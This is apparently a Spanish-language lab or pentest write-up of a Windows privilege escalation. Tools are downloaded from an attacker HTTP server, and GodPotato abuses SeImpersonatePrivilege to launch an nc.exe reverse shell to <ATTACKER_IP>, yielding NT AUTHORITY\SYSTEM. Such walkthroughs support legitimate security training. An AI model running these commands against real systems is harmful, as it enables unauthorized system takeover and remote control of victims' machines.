## Explotación

Con `SeImpersonatePrivilege` identificado y habilitado, podemos pasar a la fase de explotación.

Para este escenario utilizaremos:

- `GodPotato.exe` explotación de `SeImpersonatePrivilege`.
- `nc.exe` recepción de una conexión `reverse shell`.

Ambos binarios deben estar disponibles en la máquina atacante y posteriormente ser transferidos al sistema víctima.

En la máquina atacante levantamos un servidor HTTP desde el directorio donde se encuentran los binarios:

```bash
python3 -m http.server 8000
```
Ahora, desde la máquina víctima descargamos las herramientas:
```
Invoke-WebRequest -Uri "http://myipaddress:8000/GodPotato.exe" -OutFile "GodPotato.exe"
Invoke-WebRequest -Uri "http://myipaddress:8000/nc.exe" -OutFile "nc.exe"
```
Con los binarios disponibles en la máquina víctima, primero comprobamos que GodPotato puede ejecutar comandos bajo el contexto de NT AUTHORITY\SYSTEM.

Desde Evil-WinRM ejecutamos:
```
*Evil-WinRM* PS C:\Windows\TEMP> .\GodPotato.exe -cmd "cmd /c whoami"
```

Durante la ejecución, GodPotato muestra que encuentra un SYSTEM token y consigue utilizarlo:
```
[*] CurrentUser: NT AUTHORITY\Servicio de red
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 476 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
```
La línea:
```
[*] Find System Token : True
```

confirma que GodPotato encontró un token perteneciente a NT AUTHORITY\SYSTEM.

Una vez comprobada la explotación, procedemos a obtener una reverse shell.

En la máquina atacante iniciamos netcat utilizando rlwrap para mejorar la interacción con la shell:
```
rlwrap nc -nlvp 7777
```
El listener queda esperando la conexión:
```
listening on [any] 7777 ...
```
Desde la máquina víctima ejecutamos GodPotato pasando nc.exe como comando:
```
*Evil-WinRM* PS C:\Windows\TEMP> .\GodPotato.exe -cmd "C:\Windows\Temp\nc.exe <ATTACKER_IP> 7777 -e cmd.exe"
```
Recibimos la conexión en la máquina atacante:
```
connect to myipaddress from (UNKNOWN) victimip 49762
Microsoft Windows [Versión 10.0.19045.6466]
(c) Microsoft Corporation. Todos los derechos reservados.
```
Finalmente, validamos el contexto de ejecución:
```
C:\WINDOWS\system32> whoami
nt authority\system
```
Con esto confirmamos que GodPotato permitió abusar de SeImpersonatePrivilege para obtener una reverse shell ejecutándose como `NT AUTHORITY\SYSTEM.`
